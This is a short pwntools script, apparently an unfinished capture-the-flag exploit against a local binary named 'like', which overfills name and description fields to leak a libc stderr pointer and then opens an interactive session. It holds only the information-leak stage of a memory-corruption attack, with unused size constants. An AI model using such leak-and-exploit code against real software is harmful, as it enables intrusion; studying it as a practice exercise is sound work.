from pwn import*
p = process('./like',env={'LD_PRELOAD':'libc.so.6'})

# gadget
size1 = 0x313000
size2 = 3000000

# definition
def choice(num):
	p.sendlineafter('Your choice : ',str(num))
	

# exploit

p.sendlineafter('Name size : ', str(0x8*13+1))
p.sendafter('Name : ','a'*0x8*13)	# 'a'*0x8*13
p.sendafter('Description : ','b'*0x8)	# 
p.recvuntil('Description : ')
p.recv(0x8*11)
stderr = u64(p.recv(6)+"\x00\x00")
print hex(stderr)



p.interactive()
